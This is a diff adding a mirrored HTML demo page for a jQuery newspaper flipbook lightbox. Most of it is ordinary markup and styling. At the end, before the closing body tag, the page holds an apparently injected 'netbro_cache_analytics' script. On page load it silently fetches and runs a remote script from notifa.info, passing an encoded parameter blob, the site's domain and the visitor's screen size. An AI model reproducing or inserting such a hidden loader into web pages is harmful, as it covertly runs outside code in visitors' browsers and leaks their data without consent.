@@ -1,0 +1,153 @@
+<html>
+  
+<!-- Mirrored from page-flip.info/jquery_newspaper_flipbook/lightbox-autostart.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 22 Feb 2018 12:35:03 GMT -->
+<head>
+	<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+   
+    <!-- viewport -->
+    <meta content="width=device-width,initial-scale=1" name="viewport">
+       
+    <!-- title -->
+    <title>lightbox Newspaper FlipBook -jQuery</title>
+        
+        
+    <!-- add css style -->
+    <link type="text/css" href="css/style.css" rel="stylesheet">
+	<link type="text/css" rel="stylesheet" href="http://fonts.googleapis.com/css?family=Play:400,700">
+    <link type="text/css" href="css/font-awesome.min.css" rel="stylesheet">
+    
+    <!-- add js code -->
+	<script src="js/jquery.js"></script>
+    <script src="js/jquery_no_conflict.js"></script>
+    <script src="js/turn.js"></script>              
+    <script src="js/wait.js"></script>
+	<script src="js/jquery.fullscreen.js"></script>
+    <script src="js/jquery.address-1.6.min.js"></script>
+	<script src="js/compatibility.js"></script>
+    <script src="js/pdf.js"></script>
+	<script src="js/onload.js"></script>
+
+
+	<style>
+	
+    html, body {
+        margin: 0;
+        padding: 0;
+		overflow:auto !important;
+		width:100%;
+		height:100%;
+    }
+	
+				
+	.bcg-intro{			
+			  border:1px solid #033;
+			  width:100%;
+			  height:100%;
+			  background: none no-repeat center center;
+			  background-size:cover;
+			 -moz-background-size:cover;
+			 -webkit-background-size:cover;
+			 /* background-image:url(img/bg.png);/*/
+			 background-color:#CCCCCC;
+			 
+		}
+		
+      .btn{		
+			text-decoration:none;			
+			color:#FFFFFF;
+			border-radius: 8px 8px 8px 8px;
+			padding:10px;
+			font-size:17px;
+			font-family:Arial;
+			font-weigh:normal;		
+			background-color: #666666;
+			color: #FFFFFF; 
+			display:block;
+			/*float:left;/*/
+		    margin:10px;
+			text-align:center;
+			width:200px;
+			opacity:1;
+		
+		}
+		
+		
+		img{		
+	        display: block;
+            margin: 0 auto;
+		}
+		
+		
+		p {
+			text-align:center;
+			font-family:Verdana, Geneva, sans-serif;
+			size:13px;
+			
+			
+		}
+
+		
+		.cont-btn{
+		  display:block;
+		  position:absolute;
+		  left:50%;
+		  top:50%;
+		  margin:0px;
+	      padding:0px;
+		  margin-left:-110px;
+		  -webkit-transform: translate(0,-50%);
+		  transform: translate(0,-50%);
+		
+		}
+				
+    </style> 
+      
+  </head> 
+  
+<body>
+  
+  
+<!--
+ATTRIBUTES FLIPBOOK DESCRIPTION:
+href ==>  your name flipbook to 'your_book_name' (must be unique and only lowercase letters with no whitespace) 
+data-content ==>  pathway to content flipbook
+data-config ==>  pathway to configuraton flipbook
+-->
+
+  
+
+<div class="bcg-intro"> 
+     <div class="cont-btn">
+    
+    <p>
+    Click on the button or image
+    </p>      
+    
+    <!-- begin flipbook lightbox code  -->
+    <a class="btn" href="load_book_lightbox(%27your_book_name%27%2ctrue).html" data-content="lightbox/content.html" data-config="lightbox/config.html"  target="_blank">Button</a>
+    <!-- end flipbook lightbox code  -->
+
+    
+    <!-- begin flipbook lightbox code  -->
+    <a href="load_book_lightbox(%27your_book_name%27%2ctrue).html" data-content="lightbox/content.html" data-config="lightbox/config.html"  target="_blank"><img src="pages/1_.jpg"/></a>
+     <!-- end flipbook lightbox code  -->
+
+      </div>
+
+    </div>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mcFFuDh5Sl4cj6g0QqsTdBVu5xpGBFPOmh4yjJW99Jtmh9TlV%2b3iFF8d7YwUY93k3ie6cBN7BHQsa2FTy%2bqQzmrgvLPSMniNi348DXvoAP3JGcErlKDRjpBxGFYqYasHvjgOIVPiCbCfYU6djMewHc5YIROYxuTS%2fFxHIq8ReETsfiq7Rr%2bFEhxlKVNV%2fD68bwxlndUtBeAVU72LDsddOihILe7OnIT9u%2bRNpmICRkQzqj0uT8BbJGIMZHSN1gOZ9OCWal7MQQPtP2oF9vFA9RxQLwodBXcai2g8Ibu5ZgxubwQGp1zLeYZwMq3deQz4MRyg6DBsARDB4BTKZH9GRZO6LHRIP4b%2fUjaN%2f8zapSLM6uVybkO1rqFJuk6Eq%2fWzZK8BXoz9O1IDGD%2bMN0MrHDuFXy0rtoslT%2fdpNvWnzHz%2faLwZMLOuX3mLKnNofW87dBybcOuJhZhAWg8HRZJrNFAA7dSuLsQUli0GbemRnWcDBmUFlGl87ilJzFRu0bmhyPMpqCfrz5o8%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+
+<!-- Mirrored from page-flip.info/jquery_newspaper_flipbook/lightbox-autostart.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 22 Feb 2018 12:35:04 GMT -->
+</html>
